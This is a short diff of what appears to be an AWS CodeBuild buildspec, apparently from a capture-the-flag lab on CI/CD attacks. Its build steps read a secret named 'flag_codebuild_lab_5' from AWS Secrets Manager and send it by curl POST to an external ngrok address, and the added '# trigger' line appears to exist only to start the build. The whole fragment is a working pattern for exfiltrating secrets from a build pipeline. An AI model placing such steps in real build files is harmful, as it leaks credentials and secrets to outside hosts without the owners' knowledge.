@@ -7,3 +7,4 @@ phases:
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
       - curl -X POST https://b92a-77-229-144-6.ngrok-free.app --data "flag=$FLAG"
       - echo "=== END ==="
+# trigger
